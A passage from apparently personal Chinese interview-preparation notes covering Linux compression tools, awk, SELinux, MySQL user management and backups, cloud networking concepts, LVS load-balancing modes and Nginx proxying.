权限，并且不允许在快照卷组中使用）。</p>\n<p>当卷组中的一个磁盘损坏时，整个卷组都会受到影响。</p>\n<p>因为加入了额外的操作，存储性能受到影响</p>\n<p>不能减小文件系统大小（受文件系统类型限制</p>\n</blockquote>\n<h4 id=\"压缩解压缩迪普汉得\"><a class=\"markdownIt-Anchor\" href=\"#压缩解压缩迪普汉得\">#</a> 压缩，解压缩 (迪普，汉得)</h4>\n<blockquote>\n<p>Linux 中可以识别的常见压缩格式，&quot;.zip&quot;、&quot;.gz&quot;、&quot;.bz2&quot;、“tar”、&quot;.tar.gz&quot;、&quot;.tar.bz2&quot; 等等</p>\n<p>1.zip 压缩</p>\n<p>zip mytxt.zip abc.txt abd.txt bcd.txt     # 把三个 txt 文件压缩成一个 zip 文件</p>\n<p>unzip -d /home/hepingfly/abc/mytxt.zip  # 如果不指定 -d 参数，默认解压到当前目录下</p>\n<p>2.gz</p>\n<p>gzip 压缩文件后会把源文件删除掉，它是不支持保留源文件的</p>\n<p>选项：<br>\n <code>-c</code> ：将压缩数据输出到标准输出中，可以用于保留源文件<br>\n <code>-d</code> ：解压缩<br>\n - r：压缩目录</p>\n<p>gzip abc.txt   # 将 abc.txt 压缩为 abc.txt.gz</p>\n<p>gzip -d   # 解压 gzip</p>\n<p>gunzip   # 解压 gzip</p>\n<p>3.bz2</p>\n<p><code>bzip2 [选项] 源文件</code> <br>\n选项：<br>\n <code>-d</code> ：解压缩<br>\n <code>-k</code> ：压缩时保留源文件<br>\n <code>-v</code> ：显示压缩的详细信息</p>\n<p>bzip2 -k bcd.txt  #压缩</p>\n<p>bzip2 -d 压缩包  # 解压</p>\n<p>bunzip2 压缩包  # 解压</p>\n<p>4.tar</p>\n<p><code>tar [选项] [-f 压缩包名] 源文件或目录</code> <br>\n选项：<br>\n <code>-c</code> ：打包</p>\n<p><code>-z</code> ：压缩和解压缩 “.tar.gz” 格式</p>\n<p><code>-f</code> ：指定压缩包的文件名。压缩包的扩展名是用来给管理员识别格式的，所以一定要正确指定扩展名。<br>\n <code>-v</code> ：显示打包文件过程</p>\n<p><code>tar [选项] 压缩包</code> <br>\n选项：<br>\n <code>-x</code> ：解打包<br>\n <code>-f</code> ：指定压缩包的文件名<br>\n <code>-v</code> ：显示解打包文件过程</p>\n<p><code>-j</code> ： 压缩和解压缩 “.tar.bz2” 格式</p>\n</blockquote>\n<h4 id=\"awk\"><a class=\"markdownIt-Anchor\" href=\"#awk\">#</a> awk</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 每行按空格或TAB分割，输出文本中的1、4项</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;&#123;print $1,$4&#125;&#x27;</span> log.txt</span><br><span class=\"line\"><span class=\"comment\"># 格式化输出</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;&#123;printf &quot;%-8s %-10s\\n&quot;,$1,$4&#125;&#x27;</span> log.txt</span><br><span class=\"line\"><span class=\"comment\"># 使用&quot;,&quot;分割</span></span><br><span class=\"line\"> $  awk -F, <span class=\"string\">&#x27;&#123;print $1,$2&#125;&#x27;</span>   log.txt</span><br><span class=\"line\"><span class=\"comment\"># 或者使用内建变量</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;BEGIN&#123;FS=&quot;,&quot;&#125; &#123;print $1,$2&#125;&#x27;</span>     log.txt</span><br><span class=\"line\"><span class=\"comment\"># 使用多个分隔符.先使用空格分割，然后对分割结果再使用&quot;,&quot;分割</span></span><br><span class=\"line\"> $ awk -F <span class=\"string\">&#x27;[ ,]&#x27;</span>  <span class=\"string\">&#x27;&#123;print $1,$2,$5&#125;&#x27;</span>   log.txt</span><br><span class=\"line\"><span class=\"comment\"># 设置变量a=1</span></span><br><span class=\"line\"> $ awk -va=1 <span class=\"string\">&#x27;&#123;print $1,$1+a&#125;&#x27;</span> log.txt</span><br><span class=\"line\"><span class=\"comment\"># awk -f &#123;awk脚本&#125; &#123;文件名&#125;</span></span><br><span class=\"line\"> $ awk -f cal.awk log.txt</span><br><span class=\"line\"><span class=\"comment\"># 过滤第一列大于2的行</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;$1&gt;2&#x27;</span> log.txt    </span><br><span class=\"line\"><span class=\"comment\"># 过滤第一列大于2并且第二列等于&#x27;Are&#x27;的行</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;$1&gt;2 &amp;&amp; $2==&quot;Are&quot; &#123;print $1,$2,$3&#125;&#x27;</span> log.txt    </span><br><span class=\"line\"><span class=\"comment\"># 输出顺序号 NR, 匹配文本行号</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;&#123;print NR,FNR,$1,$2,$3&#125;&#x27;</span> log.txt</span><br><span class=\"line\"><span class=\"comment\"># 指定输出分割符</span></span><br><span class=\"line\"> $  awk <span class=\"string\">&#x27;&#123;print $1,$2,$5&#125;&#x27;</span> OFS=<span class=\"string\">&quot; $ &quot;</span>  log.txt</span><br><span class=\"line\"><span class=\"comment\"># 输出第二列包含 &quot;th&quot;，并打印第二列与第四列(~ 表示模式开始// 中是模式)</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;$2 ~ /th/ &#123;print $2,$4&#125;&#x27;</span> log.txt</span><br><span class=\"line\"><span class=\"comment\"># 忽略大小写</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;BEGIN&#123;IGNORECASE=1&#125; /this/&#x27;</span> log.txt</span><br><span class=\"line\"><span class=\"comment\"># BEGIN&#123; 这里面放的是执行前的语句 &#125;</span></span><br><span class=\"line\"><span class=\"comment\"># END &#123;这里面放的是处理完所有的行后要执行的语句 &#125;</span></span><br><span class=\"line\"><span class=\"comment\"># &#123;这里面放的是处理每一行时要执行的语句&#125;</span></span><br><span class=\"line\"><span class=\"comment\"># 计算文件大小</span></span><br><span class=\"line\"> $ <span class=\"built_in\">ls</span> -l *.txt | awk <span class=\"string\">&#x27;&#123;sum+=$5&#125; END &#123;print sum&#125;&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> grep 更适合单纯的查找或匹配文本</span><br><span class=\"line\"> sed 更适合编辑匹配到的文本</span><br><span class=\"line\"> awk 更适合格式化文本，对文本进行较复杂格式处理</span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\"> FS(Field Separator)：输入字段分隔符， 默认为空白字符</span><br><span class=\"line\"> OFS(Out of Field Separator)：输出字段分隔符， 默认为空白字符</span><br><span class=\"line\"> RS(Record Separator)：输入记录分隔符(输入换行符)， 指定输入时的换行符</span><br><span class=\"line\"> ORS(Output Record Separate)：输出记录分隔符（输出换行符），输出时用指定符号代替换行符</span><br><span class=\"line\"> NF(Number <span class=\"keyword\">for</span> Field)：当前行的字段的个数(即当前行被分割成了几列)</span><br><span class=\"line\"> NR(Number of Record)：行号，当前处理的文本行的行号。</span><br><span class=\"line\"> FNR：各文件分别计数的行号</span><br><span class=\"line\"> ARGC：命令行参数的个数</span><br><span class=\"line\"> ARGV：数组，保存的是命令行所给定的各参数</span><br></pre></td></tr></table></figure>\n<h4 id=\"selinux\"><a class=\"markdownIt-Anchor\" href=\"#selinux\">#</a> selinux</h4>\n<blockquote>\n<p>Linux 下默认的接入控制是 DAC，其特点是资源的拥有者可以对他进行任何操作（读、写、执行）。当一个进程准备操作资源时，Linux 内核会比较进程和资源的 UID 和 GID，如果权限允许，就可以进行相应的操作。</p>\n<p>SELinux 属于 MAC 的具体实现，增强了 Linux 系统的安全性。MAC 机制的特点在于，资源的拥有者，并不能决定谁可以接入到资源。具体决定是否可以接入到资源，是基于安全策略。而安全策略则是有一系列的接入规则组成，并仅有特定权限的用户有权限操作安全策略。</p>\n<p>Security Enhanced Linux (SELinux) 为 Linux 提供了一种增强的安全机制，其本质就是回答了一个 “Subject 是否可以对 Object 做 Action?” 的问题，例如 Web 服务可以写入到用户目录下面的文件吗？其中 Web 服务就是 Subject 而文件就是 Object，写入对应的就是 Action。</p>\n<ul>\n<li>Subject: 在 SELinux 里指的就是进程，也就是操作的主体。</li>\n<li>Object： 操作的目标对象，例如 文件</li>\n<li>Action： 对 Object 做的动作，例如 读取、写入或者执行等等</li>\n<li>Context： Subject 和 Object 都有属于自己的 Context，也可以称作为 Label。Context 有几个部分组成，分别是 SELinux User、SELinux Role、SELinux Type、SELinux Level</li>\n</ul>\n<p>进程和文件都有属于自己的 Context 信息，Context 分为几个部分，分别是 SELinux User、Role、Type 和一个可选的 Level 信息。SELinux 在运行过程中将使用这些信息查询安全策略进行决策。</p>\n<p>显示进程的 Context ps -z</p>\n<p>显示文件的 Context 信息 ls -z</p>\n<p>临时修改文件的 SELinux Type 为 <code>htttpd_sys_content_t</code>   \t <code>chcon -t httpd_sys_content_t file-name</code></p>\n<p>SELinux 有三个运行状态，分别是 disabled, permissive 和 enforcing</p>\n<ul>\n<li>Disable： 禁用 SELinux，不会给任何新资源打 Label，如果重新启用的话，将会给资源重新打上 Lable，过程会比较缓慢。</li>\n<li>Permissive：如果违反安全策略，并不会真正的执行拒绝操作，替代的方式是记录一条 log 信息。</li>\n<li>Enforcing: 默认模式，SELinux 的正常状态，会实际禁用违反策略的操作</li>\n</ul>\n<p>SELinux 的 Log 日志默认记录在 <code>/var/log/audit/audit.log</code></p>\n<p>SELinux 的配置文件位于 <code>/etc/selinux/config</code></p>\n<p>Booleans 允许在运行时修改 SELinux 安全策略。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC84NjgxMzcwOQ==\">理解 Linux 下的 SELinux - 知乎 (zhihu.com)</span></p>\n</blockquote>\n<h3 id=\"10mysql相关\"><a class=\"markdownIt-Anchor\" href=\"#10mysql相关\">#</a> 10.mysql 相关</h3>\n<h4 id=\"mysql新建用户茄子\"><a class=\"markdownIt-Anchor\" href=\"#mysql新建用户茄子\">#</a> mysql 新建用户 (茄子)</h4>\n<blockquote>\n<ol>\n<li></li>\n</ol>\n<p>CREATE USER user_account IDENTIFIED BY password;  #CREATE USER dbadmin@localhost  IDENTIFIED BY ‘pwd123’;</p>\n<p>CREATE USER superadmin@’%’ IDENTIFIED BY ‘mypassword’; # 要允许用户帐户从任何主机连接，请使用百分比 ( <code>%</code> ) 通配符</p>\n<p>CREATE USER remote_user; #可以从任何主机连接到数据库服务器：</p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>可以使用 INSERT 语句将用户的信息添加到 mysql.user 表中，但必须拥有对 mysql.user 表的 INSERT 权限。通常 INSERT 语句只添加 Host、User 和 authentication_string 这 3 个字段的值。</p>\n<p>INSERT INTO mysql.user(Host, User,  authentication_string, ssl_cipher, x509_issuer, x509_subject) VALUES (‘hostname’, ‘username’, PASSWORD(‘password’), ‘’, ‘’, ‘’);</p>\n<ol start=\"3\">\n<li></li>\n</ol>\n<p>GRANT SELECT ON*.* TO ‘test3’@localhost IDENTIFIED BY ‘test3’;</p>\n<p>4. 删除用户</p>\n<p>DROP USER ‘username’@‘host’;</p>\n<p>5. 更改密码</p>\n<p>SET PASSWORD FOR ‘username’@‘host’ = PASSWORD(‘newpassword’);</p>\n</blockquote>\n<h4 id=\"mysql查看权限茄子\"><a class=\"markdownIt-Anchor\" href=\"#mysql查看权限茄子\">#</a> mysql 查看权限 (茄子)</h4>\n<blockquote>\n<p>SHOW GRANTS FOR dbadmin@localhost;</p>\n<p>GRANT privileges ON databasename.tablename TO ‘username’@‘host’</p>\n<p>REVOKE privilege ON databasename.tablename FROM ‘username’@‘host’;</p>\n</blockquote>\n<h4 id=\"mysql备份中海达\"><a class=\"markdownIt-Anchor\" href=\"#mysql备份中海达\">#</a> mysql 备份 (中海达)</h4>\n<blockquote>\n<p>mysqldump -h 主机名 -P 端口 -u 用户名 -p 密码 –database 数据库名 &gt; 文件名.sql</p>\n<p>mysqldump –all-databases &gt; allbackupfile.sql     // 备份所有数据库</p>\n<p>直接将 MySQL 数据库压缩备份</p>\n<p>mysqldump -hhostname -uusername -ppassword -database databasename | gzip &gt; backupfile.sql.gz</p>\n<p>备份 MySQL 数据库某个 (些) 表</p>\n<p>mysqldump -hhostname -uusername -ppassword databasename specific_table1 specific_table2 &gt; backupfile.sql</p>\n<p>免费的 MySQl 热备份软件 Percona XtraBackup</p>\n<p>恢复数据库</p>\n<p>source /opt/all.sql;</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3F5ZjE1ODIzNi9hcnRpY2xlL2RldGFpbHMvMTA5MjIwNTYz\">学习 MySQL 备份一篇就够了！！！（完全备份、增量备份、备份恢复）_下一个艺术家的博客 - CSDN 博客_mysql 备份文件</span></p>\n<h4 id=\"mysql可靠中海达\"><a class=\"markdownIt-Anchor\" href=\"#mysql可靠中海达\">#</a> mysql 可靠 (中海达)</h4>\n<blockquote>\n<p>… 这个问题超标了，自己看吧</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yNTk2MDIwOA==\">五大常见的 MySQL 高可用方案 - 知乎 (zhihu.com)</span></p>\n</blockquote>\n<h4 id=\"acid汉得\"><a class=\"markdownIt-Anchor\" href=\"#acid汉得\">#</a> acid (汉得)</h4>\n<blockquote>\n<p>数据库管理系统在写入或更新资料的过程中，为保证事务（transaction）是正确可靠的，所必须具备的四个特性</p>\n<ul>\n<li>Atomicity（原子性）：一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被恢复（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。</li>\n<li>Consistency（一致性）：在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设规则，这包含资料的精确度、串联性以及后续数据库可以自发性地完成预定的工作。</li>\n<li>Isolation（隔离性）：数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。事务隔离分为不同级别，包括读未提交（Read uncommitted）、读提交（read committed）、可重复读（repeatable read）和串行化（Serializable）。</li>\n<li>Durability（持久性）：事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。</li>\n</ul>\n</blockquote>\n<h4 id=\"mysql锁汉得\"><a class=\"markdownIt-Anchor\" href=\"#mysql锁汉得\">#</a> mysql 锁 (汉得)</h4>\n<blockquote>\n<p>先挖个坑</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yOTE1MDgwOQ==\">MySQL 锁总结 - 知乎 (zhihu.com)</span></p>\n</blockquote>\n<h4 id=\"隔离级别汉得\"><a class=\"markdownIt-Anchor\" href=\"#隔离级别汉得\">#</a> 隔离级别 (汉得)</h4>\n<blockquote>\n<p>再挖个坑</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIuYWxpeXVuLmNvbS9hcnRpY2xlLzc0MzY5MQ==\">彻底搞懂 MySQL 事务的隔离级别 - 阿里云开发者社区 (aliyun.com)</span></p>\n</blockquote>\n<h4 id=\"主键外键区别主键索引区别汉得\"><a class=\"markdownIt-Anchor\" href=\"#主键外键区别主键索引区别汉得\">#</a> 主键，外键区别，主键，索引区别 (汉得)</h4>\n<blockquote>\n<p>1、主键用来保证数据完整性，外键用来和其他表建立联系用；</p>\n<p>2、主键只能有一个，而一个表可以有多个外键；</p>\n<p>3、主键不能有重复，不允许为空，而外键可以有重复，可以是空值。</p>\n<p>主键、外键和索引的区别：</p>\n<p>a. 定义</p>\n<p>主键：唯一标识一条记录，不能有重复，不允许为空。<br>\n外键：表的外键是另一表的主键，外键是可以有重复的，可以是空值。<br>\n索引：该字段没有重复值，但可以有一个空值。</p>\n<p>b. 作用</p>\n<p>主键：用来保证数据完整性<br>\n外键：用来和其他表建立联系用<br>\n索引：用来提高查询排序的速度</p>\n<p>c. 个数</p>\n<p>主键：主键只能有一个。<br>\n外键：一个表可以有多个外键。<br>\n索引：一个表可以有多个唯一索引。</p>\n<p><strong>提高了查询效率</strong>，<strong>缺点是在插入、更新和删除记录时，需要同时修改索引</strong>，<strong>因此，索引越多，插入、更新和删除记录的速度就越慢。</strong></p>\n<p>通过 <code>UNIQUE</code>  关键字我们就添加了一个唯一索引</p>\n</blockquote>\n<h3 id=\"10云计算相关问题\"><a class=\"markdownIt-Anchor\" href=\"#10云计算相关问题\">#</a> 10. 云计算相关问题</h3>\n<h4 id=\"使用过公有云吗对公有云了解吗中科还问了openstack了解吗中海达茄子中科曙光\"><a class=\"markdownIt-Anchor\" href=\"#使用过公有云吗对公有云了解吗中科还问了openstack了解吗中海达茄子中科曙光\">#</a> 使用过公有云吗，对公有云了解吗，中科还问了 OpenStack 了解吗 (中海达，茄子，中科曙光)</h4>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNTU5ODQzNw==\">OpenStack 入门科普，看这一篇就够啦！ - 知乎 (zhihu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS91XzE0NTU3NjczLzI0NzM4OTU=\">OpenStack 入门 —— 理论篇（一）：OpenStack 的概念、概览以及核心组件概述_51CTO 博客_openstack 的技术核心</span></p>\n<p>表示层：负责与用户交互，主要包含一些图形化界面的 web 门户网站（用于提供给非开发人员进行界面操作），同时该部分还提供了供开发人员进行二次开发的 API 接口。该部分还包括一些更高级的特性，例如：负载均衡、控制台代理安全和命名服务。</p>\n<p>逻辑层：提供云服务的智能控制功能，如：orchestration（负责任务的工作流管理）、scheduling（任务到资源的调度管理）、policy（配额等服务）、image registry（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbmZvLnN1cHBvcnQuaHVhd2VpLmNvbS9pbmZvLWZpbmRlci9lbmN5Y2xvcGVkaWEvemgvJUU5JTk1JTlDJUU1JTgzJThGLmh0bWw=\">镜像</span>实例的元数据管理）和 logging（事件计费管理)。</p>\n<p>资源层：包含计算、网络和存储等物理资源。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbmZvLnN1cHBvcnQuaHVhd2VpLmNvbS9pbmZvLWZpbmRlci9lbmN5Y2xvcGVkaWEvemgvJUU1JTg1JUFDJUU2JTlDJTg5JUU0JUJBJTkxLmh0bWw=\">什么是公有云？和私有云什么区别？ - 华为 (huawei.com)</span></p>\n</blockquote>\n<h4 id=\"iaaspaassaas吉利英伦\"><a class=\"markdownIt-Anchor\" href=\"#iaaspaassaas吉利英伦\">#</a> IAAS，PAAS，SAAS (吉利英伦)</h4>\n<blockquote>\n<p>Infrastructure-as-a-service<br>\nPlatform-as-a-service<br>\nSoftware-as-a-service</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029101351518.png\" alt=\"image-20221029101351518\" style=\"zoom:67%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029101444881.png\" alt=\"image-20221029101444881\" style=\"zoom:67%;\" />\n</blockquote>\n<h4 id=\"vpc之间网络隔离云智\"><a class=\"markdownIt-Anchor\" href=\"#vpc之间网络隔离云智\">#</a> VPC 之间网络隔离（云智）</h4>\n<blockquote>\n<p>安全组是一个逻辑上的分组，由一个区域内具有相同安全需求的 ECS 组成。安全组和 ECS 绑定，可以实现如防火墙一样的功能，不同安全组的实例默认不相通，但可以授权两个安全组之间互访。</p>\n<p>网络 ACL 与安全组类似，也是安全防护策略，若想增加额外的安全防护层时，就可以启用网络 ACL。网络 ACL 是对子网的一个保护，通过与子网关联的出方向、入方向规则控制出入子网的数据流。安全组只有 “允许” 策略，但网络 ACL 可以 “拒绝” 和 “允许”。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM3ODk3My9hcnRpY2xlL2RldGFpbHMvMTEyNTE3MDk2\">vpc 网络隔离_云计算中 VPC 的由来及浅析_爱吃生菜的鱼的博客 - CSDN 博客</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8yOTczNTgwNy9hcnRpY2xlL2RldGFpbHMvMTEyNTE3MTAw\">(66 条消息) vpc 网络隔离_一文秒懂云中安全 VPC_英俊潇洒你冲哥的博客 - CSDN 博客</span></p>\n</blockquote>\n<h3 id=\"11负载均衡相关\"><a class=\"markdownIt-Anchor\" href=\"#11负载均衡相关\">#</a> 11. 负载均衡相关</h3>\n<h4 id=\"有哪些负载均衡器茄子\"><a class=\"markdownIt-Anchor\" href=\"#有哪些负载均衡器茄子\">#</a> 有哪些负载均衡器 (茄子)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LVS、Nginx、Haproxy</span><br><span class=\"line\">LVS:</span><br><span class=\"line\">1). 基于4层网络协议，几乎无流量产生，这个特点也决定这几个负载均衡软件里负载能力最强，内存、CPU占用资源也低。</span><br><span class=\"line\">2). 应用范围广，不仅对Web服务做负载均衡，而且可结合其他应用做负载，如LVS+MySQL负载均衡。</span><br><span class=\"line\">3). 配置简单， 可配置东西较少。</span><br><span class=\"line\">4). 无流量，LVS只分发请求，而流量并不从它本身出去，这点保证了均衡器IO的性能不会收到大流量的影响。</span><br><span class=\"line\">5). 有个虚IP概念。</span><br><span class=\"line\">Nginx:</span><br><span class=\"line\">1). 基于7层网络协议，对Http应用做分流策略，如配置域名。</span><br><span class=\"line\">2). 高负载、稳定。支持上万高并发。负载能力小于LVS。</span><br><span class=\"line\">3). 安装配置简单，支持的正则比Haproxy丰富。且对网络稳定性的依赖非常小。</span><br><span class=\"line\">4). 可通过端口检测到服务器内部的故障，如根据服务器处理网页返回的状态码、超时等，把返回错误的请求重新提交到另一个节点。</span><br><span class=\"line\">5). 作Web服务器。</span><br><span class=\"line\">6). 反向代理\\负载均衡。</span><br><span class=\"line\">Haproxy:</span><br><span class=\"line\">1). 支持虚拟主机，可工作在4层、7层。</span><br><span class=\"line\">2). 负载均衡效率上来讲Haproxy比Nginx更出色，在并发处理上也是优于Nginx。</span><br><span class=\"line\">3). 能够补充Nginx的一些缺点，如支持Session的保持，Cookie的引导。同时支持通过获取指定的url来检测后端服务器的状态。</span><br><span class=\"line\">4). 支持负载均衡策略较多。如roundrobin简单轮询、leastconn最少服务器连接数、static-rr权重轮询、uri哈希、sourceIP哈希、url_param请求的URL参数等。</span><br><span class=\"line\"></span><br><span class=\"line\">https://www.yisu.com/zixun/14680.html</span><br></pre></td></tr></table></figure>\n<h4 id=\"lvs云智\"><a class=\"markdownIt-Anchor\" href=\"#lvs云智\">#</a> LVS（云智）</h4>\n<blockquote>\n<p>LVS（Linux Virtual Server）即 Linux 虚拟服务器，是开源负载均衡项目，目前 LVS 已经被集成到 Linux 内核模块中。该项目在 Linux 内核中实现了基于 IP 的数据请求负载均衡调度方案，其体系结构如图 1 所示，终端互联网用户从外部访问公司的外部负载均衡服务器，终端用户的 Web 请求会发送给 LVS 调度器，调度器根据自己预设的算法决定将该请求发送给后端的某台 Web 服务器，比如，轮询算法可以将外部的请求平均分发给后端的所有服务器，终端用户访问 LVS 调度器虽然会被转发到后端真实的服务器，但如果真实服务器连接的是相同的存储，提供的服务也是相同的服务，最终用户不管是访问哪台真实服务器，得到的服务内容都是一样的，整个集群对用户而言都是透明的。最后根据 LVS 工作模式的不同，真实服务器会选择不同的方式将用户需要的数据发送到终端用户，<strong>LVS 工作模式分为 NAT 模式、TUN 模式、以及 DR 模式。</strong><br>\n1、基于 NAT 的 LVS 模式负载均衡</p>\n<p>在 LVS（NAT）模式的集群环境中，由于所有的数据请求及响应的数据包都需要经过 LVS 调度器转发，如果后端服务器的数量大于 10 台，则调度器就会成为整个集群环境的瓶颈。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031102931633.png\" alt=\"image-20221031102931633\"></p>\n<p>2. 基于 TUN 的 LVS 负载均衡</p>\n<p>LVS（TUN）的思路就是将请求与响应数据分离，让调度器仅处理数据请求，而让真实服务器响应数据包直接返回给客户端。</p>\n<p>LVS（TUN）模式要求真实服务器可以直接与外部网络连接，真实服务器在收到请求数据包后直接给客户端主机响应数据。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031102950493.png\" alt=\"image-20221031102950493\"></p>\n<p>3、基于 DR 的 LVS 负载均衡</p>\n<p>直接路由模式（DR 模式）要求调度器与后端服务器必须在同一个局域网内，VIP 地址需要在调度器与后端所有的服务器间共享，因为最终的真实服务器给客户端回应数据包时需要设置源 IP 为 VIP 地址，目标 IP 为客户端 IP，这样客户端访问的是调度器的 VIP 地址，回应的源地址也依然是该 VIP 地址（真实服务器上的 VIP），客户端是感觉不到后端服务器存在的。</p>\n<p>调度器根据算法在选出真实服务器后，在不修改数据报文的情况下，将数据帧的 MAC 地址修改为选出的真实服务器的 MAC 地址，通过交换机将该数据帧发给真实服务器。整个过程中，真实服务器的 VIP 不需要对外界可见。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031102959587.png\" alt=\"image-20221031102959587\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MDQ3MDMwMy9hcnRpY2xlL2RldGFpbHMvODA1NDE2Mzk=\">LVS 负载均衡（LVS 简介、三种工作模式、十种调度算法）_chenhuyang 的博客 - CSDN 博客_lvs 负载均衡</span></p>\n</blockquote>\n<h3 id=\"12有哪些监控软件中海达茄子\"><a class=\"markdownIt-Anchor\" href=\"#12有哪些监控软件中海达茄子\">#</a> 12. 有哪些监控软件 (中海达，茄子)</h3>\n<blockquote>\n<p>Prometheus（普罗米修斯）</p>\n<p>Zabbix</p>\n<p>Cacti</p>\n<p>Nagios</p>\n<p>Grafana</p>\n<p>Open-falcon</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Q4MTE2MTg5NTIwL2FydGljbGUvZGV0YWlscy84MTczNzY5NA==\">https://blog.csdn.net/t8116189520/article/details/81737694</span></p>\n</blockquote>\n<h3 id=\"13中间件相关\"><a class=\"markdownIt-Anchor\" href=\"#13中间件相关\">#</a> 13. 中间件相关</h3>\n<h4 id=\"nginx了解吗nginx特性正向代理和反向代理负载均衡模式中海达长亭品高\"><a class=\"markdownIt-Anchor\" href=\"#nginx了解吗nginx特性正向代理和反向代理负载均衡模式中海达长亭品高\">#</a> Nginx 了解吗，Nginx 特性，正向代理和反向代理，负载均衡模式 (中海达，长亭，品高)</h4>\n<blockquote>\n<p>1. 正向代理和反向代理<br>\n正向代理： 一般的访问流程是客户端直接向目标服务器发送请求并获取内容，使用正向代理后，客户端改为向代理服务器发送请求，并指定目标服务器（原始服务器），然后由代理服务器和原始服务器通信，转交请求并获得的内容，再返回给客户端。正向代理隐藏了真实的客户端，为客户端收发请求，使真实客户端对服务器不可见；</p>\n<p>比如你访问 Google 时用的代理服务器就是正向代理</p>\n<p>反向代理： 与一般访问流程相比，使用反向代理后，直接收到请求的服务器是代理服务器，然后将请求转发给内部网络上真正进行处理的服务器，得到的结果返回给客户端。反向代理隐藏了真实的服务器，为服务器收发请求，使真实服务器对客户端不可见。一般在处理跨域请求的时候比较常用。现在基本上所有的大型网站都设置了反向代理。Nginx 可以根据不同的正则匹配，采取不同的转发策略，比如图片文件结尾的走文件服务器，动态页面走 web 服务器。并且 Nginx 